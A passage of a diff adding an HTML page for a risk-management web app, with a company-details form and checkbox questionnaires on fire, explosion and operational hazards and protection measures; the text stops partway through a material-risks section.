@@ -1,0 +1,1316 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Risk Management</title>
+    <meta name="viewport" content="initial-scale=1.0, user-scalable=no">
+    <meta charset="utf-8">
+    <link rel="stylesheet" href="./libraries/bootstrap.min.css">
+    <link rel="stylesheet" href="./css/style.css">
+    <script src="https://use.fontawesome.com/5b4025bff4.js"></script>
+    <link href="https://fonts.googleapis.com/css?family=Rancho" rel="stylesheet">
+    <link rel="stylesheet" href="https://bootswatch.com/flatly/bootstrap.min.css">
+</head>
+
+<body>
+    <!-- Fixed navbar -->
+    <nav class="navbar navbar-default navbar-fixed-top" style="background: rgba(0,0,0,0.1)">
+      <div class="collapse">
+
+      </div>
+        <div class="container">
+            <div class="navbar-header">
+                <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="fa fa-bars"></span>
+                </button>
+                <a class="navbar-brand" href="/home.html"><span class="fa fa-twitter"></span> risk management</a>
+            </div>
+            <div id="navbar" class="navbar-collapse collapse">
+
+                <ul class="nav navbar-nav navbar-right">
+                    <li><a href="#" onclick="logoutUser()">Logout</a></li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+    <!-- companty information -->
+    <div id="companyinformation">
+        <div class="container">
+            <!-- Alert -->
+            <div class="row">
+                <div class="col-xs-6 col-xs-offset-3" id="alert-message">
+                </div>
+            </div>
+            <!-- Tweets -->
+            <div class="row">
+                <div class="col-xs-10 col-xs-offset-1" style="background: rgba(0,0,0,0);">
+                    <div class="row">
+                        <div class="col-md-10 col-md-offset-1 col-sm-10 col-sm-offset-1 col-xs-10 col-xs-offset-1" >
+                            <div class="form-group row">
+                              <form id="add-company-form">
+                                <label  for="corporateGroup">Corporate Group</label>
+                                    <input id="corporateGroup" name="corporateGroup" type="text" placeholder="" class="form-control input-md" required>
+                                <label  for="sitename">Company, site name</label>
+                                    <input id="sitename" name="sitename" type="text" placeholder="" class="form-control input-md" required>
+                                <label  for="Address">Address</label>
+                                    <input id="Address" name="Address" type="text" placeholder="" class="form-control input-md" required>
+                                <label  for="longitude">Longitude</label>
+                                    <input id="longitude" name="longitude" type="text" placeholder="" class="form-control input-md" required>
+                                <label  for="latitude">latitude</label>
+                                    <input id="latitude" name="latitude" type="text" placeholder="" class="form-control input-md" required>
+                                <label  for="MainOccupancy">Main Occupancy</label>
+                                    <input id="MainOccupancy" name="MainOccupancy" type="text" placeholder="" class="form-control input-md" required>
+                                <label  for="industryCategory">Industry Category</label>
+                                    <input id="industryCategory" name="industryCategory" type="text" placeholder="" class="form-control input-md" required>
+                                <label  for="selectbasic">Risk Class (1-4)*</label>
+                                    <select id="riskclass" name="selectbasic" class="form-control" style="color:black">
+                                      <option value="1">1</option>
+                                      <option value="2">2</option>
+                                      <option value="3">3</option>
+                                      <option value="4">4</option>
+                                    </select>
+                                    <label  for="Comment">Comment</label>
+                                    <textarea class="form-control" id="Comment" name="Comment" required></textarea>
+                              </div>
+                              <div class="">
+
+                              </div>
+                            </form>
+                              <button type="submit" class="btn btn-lg btn-default " style="text-alignt:center" onclick="insertData()">Submit</button>
+                            </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+<div id="inputmenu" hidden>
+
+        <div class="row">
+            <div class="col-md-10 col-md-offset-1 col-sm-10 col-sm-offset-1 col-xs-10 col-xs-offset-1" >
+                <div class="form-group row">
+                  <div class="row">
+                      <div class="col-md-3">
+                        <ul style="list-style-type:none">
+                          <h1   data-toggle="collapse" data-target="#companyProfileDetail">
+                          <span class="glyphicon glyphicon-user" aria-hidden="true" style="width:100%"></span>
+                          Company Profile
+                        </h1 >
+                      </ul>
+
+                      </div>
+                      <div class="col-md-9">
+                        <div id="companyProfileDetail" class="collapse">
+                        </div>
+                      </div>
+
+                  </div>
+
+                <div class="row">
+
+                  <div class="col-md-3">
+                    <ul style="list-style-type:none">
+                      <h1 data-toggle="collapse" data-target="#machinery">
+                      <span class="glyphicon glyphicon-blackboard" aria-hidden="true" style="width:100%"></span>
+                      Machinery
+                    </h1 ><li data-toggle="modal" data-target="#myMachineryPot"><span class="glyphicon glyphicon-expand" aria-hidden="true"></span>Potential<span id="iconMachinerypot"></span></li>
+                          <li data-toggle="modal" data-target="#myMachineryProt"><span class="glyphicon glyphicon-expand" aria-hidden="true"></span>Protection<span id="iconMachineryprot"></span></li>
+                    </ul>
+
+                  </div>
+                  <div class="col-md-9">
+                    <div id="machinery" class="collapse">
+                      Asu Lorem ipsum dolor sit amet, consectetur adipisicing elit,
+                      sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,
+                      quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
+                    </div>
+                  </div>
+                </div>
+
+                <div class="row">
+                  <div class="col-md-3">
+                    <ul style="list-style-type:none">
+                      <h1 data-toggle="collapse" data-target="#business">
+                      <span class="glyphicon glyphicon-usd" aria-hidden="true" style="width:100%"></span>
+                      Business
+                    </h1><li data-toggle="modal" data-target="#businessPotential"><span class="glyphicon glyphicon-expand" aria-hidden="true"></span>Potential<span id="iconBusinesspot"></span></li>
+                          <li data-toggle="modal" data-target="#businessProtection"><span class="glyphicon glyphicon-expand" aria-hidden="true"></span>Protection<span id="iconBusinessprot"></span></li>
+                    </ul>
+                  </div>
+                  <div class="col-md-9">
+                    <div id="business" class="collapse">
+                      Lorem ipsum dolor sit amet, consectetur adipisicing elit,
+                      sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,
+                      quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
+                    </div>
+                  </div>
+                </div>
+
+                <div class="row">
+                  <div class="col-md-3">
+                    <ul style="list-style-type:none">
+                      <h1 data-toggle="collapse" data-target="#fire">
+                      <span class="glyphicon glyphicon-fire" aria-hidden="true" style="width:100%"></span>
+                      Fire Hazard
+                      </h1>
+                      <li data-toggle="modal" data-target="#myHazardPotFire"><span class="glyphicon glyphicon-expand" aria-hidden="true"></span>Potential<span id="iconFirepot"></span></li>
+                      <li data-toggle="modal" data-target="#myHazardProFire"><span class="glyphicon glyphicon-expand" aria-hidden="true"></span>Protection<span id="iconFireprot"></span></li>
+                    </ul>
+                  </div>
+                  <div class="col-md-9">
+                    <div id="fire" class="collapse">
+                      Lorem ipsum dolor sit amet, consectetur adipisicing elit,
+                      sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,
+                      quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
+                    </div>
+                  </div>
+                </div>
+
+                <div class="row">
+                  <div class="col-md-3">
+                    <ul style="list-style-type:none">
+                      <h1 data-toggle="collapse" data-target="#natural">
+                      <span class="glyphicon glyphicon-globe" aria-hidden="true" style="width:100%"></span>
+                      Natural
+                      </h1>
+                      <li data-toggle="modal" data-target="#naturalPotential"><span class="glyphicon glyphicon-expand" aria-hidden="true"></span>Potential<span id="iconNaturalpot"></span></li>
+                      <li data-toggle="modal" data-target="#naturalProtection"><span class="glyphicon glyphicon-expand" aria-hidden="true"></span>Protection<span id="iconNaturalprot"></span></li>
+                    </ul>
+                  </div>
+                  <div class="col-md-9">
+                    <h1> </h1>
+                    <div id="natural" class="collapse">
+                      Lorem ipsum dolor sit amet, consectetur adipisicing elit,
+                      sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,
+                      quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+        </div>
+        <!-- the end of company information -->
+
+        <!-- modal form begin -->
+        <!-- Modal Hazard Protection Fire -->
+        <div class="modal fade" id="myHazardProFire" role="dialog">
+          <div class="modal-dialog">
+            <div class="modal-content">
+              <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal">&times;</button>
+                <h3 class="modal-title jumbotron text-center">Fire, Explosion and Operational Risk<span><h4 class="btn btn-success text-center">Protection level : <br>Hazards Identification and Exposure Monitoring</h4></span></h3>
+              </div>
+
+              <div class="modal-body">
+
+                    <fieldset>
+
+                    <!-- PH 1 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <div class="">
+                        <label class="col-md-12 text-center" for="selectbasic">Detection :<br>sensors (fire, gas, ignition sources), alarm management (manual, automatic)</label>
+                        <div class="col-md-12" style="padding-top: 10px;">
+                          <div class="detection" style="text-align:left;">
+                            <input type="checkbox" name="type" value="sensors" onclick="inputData('detection')"/>Sensors (fire, gas, ignition sources)<br/>
+                            <input type="checkbox" name="type" value="alarm management" onclick="inputData('detection')" />Alarm management (manual, automatic)<br/>
+                          </div>
+                        </div>
+                      </div>
+
+                    </div>
+
+                    <!-- PH 2 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Monitoring :<br>process control, control rooms, server rooms, data processing</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="monitoring" style="text-align:left;">
+                          <input type="checkbox" name="type" value="process control" onclick="inputData('monitoring')"/>Process Control<br/>
+                          <input type="checkbox" name="type" value="control rooms" onclick="inputData('monitoring')" />Control Rooms<br/>
+                          <input type="checkbox" name="type" value="server rooms" onclick="inputData('monitoring')"/>Server Rooms<br/>
+                          <input type="checkbox" name="type" value="data processing" onclick="inputData('monitoring')"/>Data Processing<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- PH 3 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Security :<br>burglary protection, intruder alarm</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="security" style="text-align:left;">
+                          <input type="checkbox" name="type" value="Burglary Protection" onclick="inputData('security')" />Burglary Protection<br/>
+                          <input type="checkbox" name="type" value="Intruder Alarm" onclick="inputData('security')"/>Intruder Alarm<br/>
+
+                        </div>
+                      </div>
+                    </div>
+
+                	</fieldset>
+
+              </div>
+
+            </div>
+
+            <!-- Modal Hazard Protection Fire Constructional-->
+            <div class="modal-content">
+              <div class="modal-body">
+
+                    <fieldset>
+
+                    <!-- PHCF 1 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <div class="">
+                        <label class="col-md-12 text-center" for="selectbasic">Location :<br>surrounding, neighborhood</label>
+                        <div class="col-md-12" style="padding-top: 10px;">
+                          <div class="location" style="text-align:left;">
+                            <input type="checkbox" name="type" value="surrounding" onclick="inputData('location')"/>Surrounding<br/>
+                            <input type="checkbox" name="type" value="neighborhood" onclick="inputData('location')" />Neighborhood<br/>
+                          </div>
+                        </div>
+                      </div>
+
+                    </div>
+
+                    <!-- PHCF 2 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">External layout :<br>spacing between buildings and units, fire complex separation</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="external" style="text-align:left;">
+                          <input type="checkbox" name="type" value="spacing between buildings and units" onclick="inputData('external')"/>Spacing Between Buildings and Units<br/>
+                          <input type="checkbox" name="type" value="fire complex separation" onclick="inputData('external')" />Fire Complex Separation<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- PHCF 3 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Internal layout :<br>physical separation within buildings and units, fire area compartmentation</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="internal" style="text-align:left;">
+                          <input type="checkbox" name="type" value="physical separation within buildings and units" onclick="inputData('internal')"/>Physical Separation within Buildings and Units<br/>
+                          <input type="checkbox" name="type" value="fire area compartmentation" onclick="inputData('internal')" />Fire Area Compartmentation<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- PHCF 4 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Construction :<br>materials, insulation, fireproofing</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="construction" style="text-align:left;">
+                          <input type="checkbox" name="type" value="materials" onclick="inputData('construction')"/>Materials<br/>
+                          <input type="checkbox" name="type" value="insulation" onclick="inputData('construction')" />Insulation<br/>
+                          <input type="checkbox" name="type" value="fireproofing" onclick="inputData('construction')"/>Fireproofing<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- PHCF 5 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Leakage control :<br>Drainage, curbing, embankments, spill protection</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="leakage" style="text-align:left;">
+                          <input type="checkbox" name="type" value="drainage" onclick="inputData('leakage')"/>Drainage<br/>
+                          <input type="checkbox" name="type" value="curbing" onclick="inputData('leakage')" />Curbing<br/>
+                          <input type="checkbox" name="type" value="embankments" onclick="inputData('leakage')"/>Embankments<br/>
+                          <input type="checkbox" name="type" value="spill protection" onclick="inputData('leakage')"/>Spill Protection<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- PHCF 6 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Building and equipment integrity :<br>technical age, operating hours, design codes, state of repair</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="building" style="text-align:left;">
+                          <input type="checkbox" name="type" value="technical age" onclick="inputData('building')"/>Technical Age<br/>
+                          <input type="checkbox" name="type" value="operating hours" onclick="inputData('building')" />Operating Hours<br/>
+                          <input type="checkbox" name="type" value="design codes" onclick="inputData('building')"/>Design Codes<br/>
+                          <input type="checkbox" name="type" value="state of repair" onclick="inputData('building')"/>State of Repair<br/>
+                        </div>
+                      </div>
+                    </div>
+
+
+                	</fieldset>
+
+              </div>
+
+               <!-- Modal Hazard Protection Fire Technical-->
+            <div class="modal-content">
+              <div class="modal-body">
+
+                    <fieldset>
+
+                    <!-- PHTF 1 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <div class="">
+                        <label class="col-md-12 text-center" for="selectbasic">Fire water supply :<br> water source, fire water pumps, fire water mains, outdoor hydrant system</label>
+                        <div class="col-md-12" style="padding-top: 10px;">
+                          <div class="firewater" style="text-align:left;">
+                            <input type="checkbox" name="type" value="water source" onclick="inputData('firewater')"/>Water Source<br/>
+                            <input type="checkbox" name="type" value="fire water pumps" onclick="inputData('firewater')" />Fire Water Pumps<br/>
+                            <input type="checkbox" name="type" value="fire water mains" onclick="inputData('firewater')"/>Fire Water Mains<br/>
+                            <input type="checkbox" name="type" value="outdoor hydrant system" onclick="inputData('firewater')"/>Outdoor Hydrant System<br/>
+                          </div>
+                        </div>
+                      </div>
+
+                    </div>
+
+                    <!-- PHTF 2 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Fixed and automatic fire suppression systems :<br> sprinkler, deluge, foam, CO2</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="fixedNautomatic"  style="text-align:left;">
+                          <input type="checkbox" name="type" value="sprinkler" onclick="inputData('fixedNautomatic')"/>Sprinkler<br/>
+                          <input type="checkbox" name="type" value="deluge" onclick="inputData('fixedNautomatic')" />Deluge<br/>
+                          <input type="checkbox" name="type" value="foam" onclick="inputData('fixedNautomatic')"/>Foam<br/>
+                          <input type="checkbox" name="type" value="CO2" onclick="inputData('fixedNautomatic')"/>CO2<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- PHTF 3 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Manual fire fighting systems :<br> hose reel boxes, indoor hydrants, fire monitors, extinguishers</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="manualFire"  style="text-align:left;">
+                          <input type="checkbox" name="type" value="hose reel boxes" onclick="inputData('manualFire')"/>Hose Reel Boxes<br/>
+                          <input type="checkbox" name="type" value="indoor hydrants" onclick="inputData('manualFire')" />Indoor Hydrants<br/>
+                          <input type="checkbox" name="type" value="fire monitors" onclick="inputData('manualFire')"/>Fire Monitors<br/>
+                          <input type="checkbox" name="type" value="extinguishers" onclick="inputData('manualFire')"/>Extinguishers<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- PHTF 4 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Emergency response :<br> Public / plant fire brigade, full-time (24/7) / voluntary, emergency team, response time, equipment</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="emergencyResponse"  style="text-align:left;">
+                          <input type="checkbox" name="type" value="Public / plant fire brigade" onclick="inputData('emergencyResponse')"/>Public / Plant Fire Brigade<br/>
+                          <input type="checkbox" name="type" value="full-time (24/7) / voluntary" onclick="inputData('emergencyResponse')" />Full-Time (24/7) / Voluntary<br/>
+                          <input type="checkbox" name="type" value="emergency team" onclick="inputData('emergencyResponse')" />Emergency Team<br/>
+                          <input type="checkbox" name="type" value="response time" onclick="inputData('emergencyResponse')"/>Response Time<br/>
+                          <input type="checkbox" name="type" value="equipment" onclick="inputData('emergencyResponse')"/>Equipment<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- PHTF 5 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Isolation and interlocks :<br> Automatic shut-down (ESD), unit isolation means, automatic interlock devices</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="isolationNinterlocks"  style="text-align:left;">
+                          <input type="checkbox" name="type" value=" Automatic shut-down (ESD)" onclick="inputData('isolationNinterlocks')"/> Automatic Shut-Down (ESD)<br/>
+                          <input type="checkbox" name="type" value="unit isolation means" onclick="inputData('isolationNinterlocks')" />Unit Isolation Means<br/>
+                          <input type="checkbox" name="type" value="automatic interlock devices" onclick="inputData('isolationNinterlocks')"/>Automatic Interlock Devices<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- PHTF 6 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Special protection :<br> smoke vents, explosion protection, lightning protection, oxygen reduction</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="specialProtection" style="text-align:left;" >
+                          <input type="checkbox" name="type" value="smoke vents" onclick="inputData('specialProtection')"/>Smoke Vents<br/>
+                          <input type="checkbox" name="type" value="explosion protection" onclick="inputData('specialProtection')" />Explosion Protection<br/>
+                          <input type="checkbox" name="type" value="lightning protection" onclick="inputData('specialProtection')"/>Lightning Protection<br/>
+                          <input type="checkbox" name="type" value="oxygen reduction" onclick="inputData('specialProtection')"/>Oxygen Reduction<br/>
+                        </div>
+                      </div>
+                    </div>
+
+
+                	</fieldset>
+
+              </div>
+
+            </div>
+
+             <!-- Modal Hazard Protection Fire Operational-->
+            <div class="modal-content">
+              <div class="modal-body">
+
+                    <fieldset>
+
+                    <!-- PHORF 1 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <div class="">
+                        <label class="col-md-12 text-center" for="selectbasic">Inspections:<br> organization, programs, procedures,
+      mechanical / electrical</label>
+                        <div class="col-md-12" style="padding-top: 10px;">
+                          <div class="inspections"  style="text-align:left;">
+                            <input type="checkbox" name="type" value="organization" onclick="inputData('inspections')"/>Organization<br/>
+                            <input type="checkbox" name="type" value="programs" onclick="inputData('inspections')" />Programs<br/>
+                            <input type="checkbox" name="type" value="procedures" onclick="inputData('inspections')"/>Procedures<br/>
+                            <input type="checkbox" name="type" value="mechanical / electrical" onclick="inputData('inspections')"/>Mechanical / Electrical<br/>
+                          </div>
+                        </div>
+                      </div>
+
+                    </div>
+
+                    <!-- PHOF 2 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Maintenance / repairs :<br> organisation, programs, procedures, impairment handling, preventive / protective</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="maintanance"  style="text-align:left;">
+                          <input type="checkbox" name="type" value="organisation" onclick="inputData('maintanance')"/>Organisation<br/>
+                          <input type="checkbox" name="type" value="programs" onclick="inputData('maintanance')" />Programs<br/>
+                          <input type="checkbox" name="type" value="procedures" onclick="inputData('maintanance')"/>Procedures<br/>
+                          <input type="checkbox" name="type" value="impairment handling" onclick="inputData('maintanance')"/>Impairment Handling<br/>
+                          <input type="checkbox" name="type" value="preventive / protective" onclick="inputData('maintanance')"/>Preventive / Protective<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- PHOF 3 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Safety installations control :<br> Inspection and maintenance of fire, fighting equipment and safety features</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="safety" style="text-align:left;" >
+                          <input type="checkbox" name="type" value="Inspection and maintenance of fire" onclick="inputData('safety')"/>Inspection and Maintenance of Fire<br/>
+                          <input type="checkbox" name="type" value="fighting equipment and safety features" onclick="inputData('safety')"/>Fighting Equipment and Safety Features<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- PHOF 4 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Workforce :<br> staffing, education, experience, training, contractors</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="workforce"  style="text-align:left;" >
+                          <input type="checkbox" name="type" value="staffing" onclick="inputData('workforce')"/>Staffing<br/>
+                          <input type="checkbox" name="type" value="education" onclick="inputData('workforce')" />Education<br/>
+                          <input type="checkbox" name="type" value="experience" onclick="inputData('workforce')"/>Experience<br/>
+                          <input type="checkbox" name="type" value="training" onclick="inputData('workforce')"/>Training<br/>
+                          <input type="checkbox" name="type" value="contractors" onclick="inputData('workforce')"/>Contractors<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- PHOF 5 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Safe work practice :<br> Shift hand-over , work permits, smoking ban, housekeeping, storage practice</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="safetyWork"  style="text-align:left;">
+                          <input type="checkbox" name="type" value="Shift hand-over" onclick="inputData('safetyWork')"/>Shift Hand-Over<br/>
+                          <input type="checkbox" name="type" value="work permits" onclick="inputData('safetyWork')" />Work Permits<br/>
+                          <input type="checkbox" name="type" value="smoking ban" onclick="inputData('safetyWork')"/>Smoking Ban<br/>
+                          <input type="checkbox" name="type" value="housekeeping" onclick="inputData('safetyWork')"/>Housekeeping<br/>
+                          <input type="checkbox" name="type" value="storage practice" onclick="inputData('safetyWork')"/>Storage Practice<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- PHOF 6 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Safety at work :<br> safety management, commitment to safety, personnel protection equipment</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="safeWork"  style="text-align:left;">
+                          <input type="checkbox" name="type" value="safety management" onclick="inputData('safeWork')"/>Safety Management<br/>
+                          <input type="checkbox" name="type" value="commitment to safety" onclick="inputData('safeWork')" />Commitment to Safety<br/>
+                          <input type="checkbox" name="type" value="personnel protection equipment" onclick="inputData('safeWork')"/>Personnel Protection Equipment<br/>
+                        </div>
+                      </div>
+                    </div>
+                	</fieldset>
+              </div>
+            </div>
+
+             <!-- Modal Hazard Protection Fire Operational Risk-->
+            <div class="modal-content">
+              <div class="modal-body">
+
+                    <fieldset>
+
+                    <!-- PHORF 1 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <div class="">
+                        <label class="col-md-12 text-center" for="selectbasic">Risk management:<br> philosophy, safety organization, safety culture, risk awareness, management KPI's</label>
+                        <div class="col-md-12" style="padding-top: 10px;">
+                          <div class="riskManagement" style="text-align:left;" >
+                            <input type="checkbox" name="type" value="philosophy" onclick="inputData('riskManagement')"/>Philosophy<br/>
+                            <input type="checkbox" name="type" value="safety organization" onclick="inputData('riskManagement')" />Safety Organization<br/>
+                            <input type="checkbox" name="type" value="safety culture" onclick="inputData('riskManagement')"/>Safety Culture<br/>
+                            <input type="checkbox" name="type" value="risk awareness" onclick="inputData('riskManagement')"/>Risk Awareness<br/>
+                            <input type="checkbox" name="type" value="management KPI's" onclick="inputData('riskManagement')"/>Management KPI's<br/>
+                          </div>
+                        </div>
+                      </div>
+
+                    </div>
+
+                    <!-- PHORF 2 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Hazard analysis :<br> programs (HAZOP), emergency plan, change management</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="hazardAnalysis" style="text-align:left;">
+                          <input type="checkbox" name="type" value="programs (HAZOP)" onclick="inputData('hazardAnalysis')"/>Programs (HAZOP)<br/>
+                          <input type="checkbox" name="type" value="emergency plan" onclick="inputData('hazardAnalysis')" />Emergency Plan<br/>
+                          <input type="checkbox" name="type" value="change management" onclick="inputData('hazardAnalysis')"/>Change Management<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- PHORF 3 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Documentation :<br> fire safety plan, emergency operating procedures, P&Ids</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="documentation" style="text-align:left;">
+                          <input type="checkbox" name="type" value="fire safety plan" onclick="inputData('documentation')"/>Fire Safety Plan<br/>
+                          <input type="checkbox" name="type" value="emergency operating procedures" onclick="inputData('documentation')" />Emergency Operating Procedures<br/>
+                          <input type="checkbox" name="type" value="P&Ids" onclick="inputData('documentation')"/>P&Ids<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- PHORF 4 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Safety audits :<br> inspection rounds, response to recommendations, incident investigation</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="safetyAudits" style="text-align:left;">
+                          <input type="checkbox" name="type" value="inspection rounds" onclick="inputData('safetyAudits')"/>Inspection Rounds<br/>
+                          <input type="checkbox" name="type" value="response to recommendations" onclick="inputData('safetyAudits')" />Response to Recommendations<br/>
+                          <input type="checkbox" name="type" value="incident investigation" onclick="inputData('safetyAudits')"/>Incident Investigation<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- PHOF 5 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Claims handling :<br> claims handling procedures, crisis management team, crisis control room</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="claimsHandling" style="text-align:left;">
+                          <input type="checkbox" name="type" value="claims handling procedures" onclick="inputData('claimsHandling')"/>Claims Handling Procedures<br/>
+                          <input type="checkbox" name="type" value="crisis management team" onclick="inputData('claimsHandling')" />Crisis Management Team<br/>
+                          <input type="checkbox" name="type" value="crisis control room" onclick="inputData('claimsHandling')"/>crisis control room<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                	</fieldset>
+
+              </div>
+              <div class="modal-footer">
+                <div id="buttonFireProt">
+                </div>
+              </div>
+
+            </div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+        <!-- Modal Hazard Fire Protection -->
+        <div class="modal fade" id="myHazardPotFire" role="dialog">
+
+          <div class="modal-dialog">
+
+            <!-- Modal content-->
+            <div class="modal-content">
+              <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal">&times;</button>
+                <h3 class="modal-title jumbotron text-center">Fire, Explosion and Operational Risk<span><h4 class="btn btn-success text-center">Hazard Potential :<br>Exposure, Hazards and Risks</h4></span></h3>
+              </div>
+
+              <div class="modal-body">
+
+
+                    <fieldset>
+
+                    <!-- Select Basic 1-->
+                    <div class="form-group text-center jumbotron row">
+                      <div class="">
+                        <label class="col-md-12 text-center" for="selectbasic">Operational Risks :<br>Occupancy Hazards, High Pressure, High Temperature, Chemical Reactions</label>
+                        <div class="col-md-12" style="padding-top: 10px;">
+                            <label class="col-md-2 control-label" for="corporateGroup"></label>
+                  		      <div class="operationalRisk" style="text-align:left;">
+                              <input type="checkbox" name="type" value="Occupancy Hazard" onclick="inputData('operationalRisk')" style="text-align:left;" />Occupancy Hazard<br/>
+                              <input type="checkbox" name="type" value="High Pressure" onclick="inputData('operationalRisk')" />High Pressure<br/>
+                              <input type="checkbox" name="type" value="High Temprature" onclick="inputData('operationalRisk')"/>High Temprature<br/>
+                              <input type="checkbox" name="type" value="Chemical Reaction" onclick="inputData('operationalRisk')"/>Chemical Reaction<br/>
+
+                            </div>
+                        </div>
+                      </div>
+
+                    </div>
+
+                    <!-- Select Basic 2-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Warehouse Risks :<br>Block Storage, High Rack Storage, Tank Farms</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="warehouseRisk" style="text-align:left;">
+                          <input type="checkbox" name="type" value="block storage" onclick="inputData('warehouseRisk')"/>Block Storage<br/>
+                          <input type="checkbox" name="type" value="high rack storage" onclick="inputData('warehouseRisk')" />High Rack Storage<br/>
+                          <input type="checkbox" name="type" value="tank farms" onclick="inputData('warehouseRisk')"/>Tank Farms<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- Select Basic 3-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Material Risks :<br>Fire Load, Flammable Liquids, Combustible Gases, Fine Dust, Explosives</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="materialRisk" style="text-align:left;">
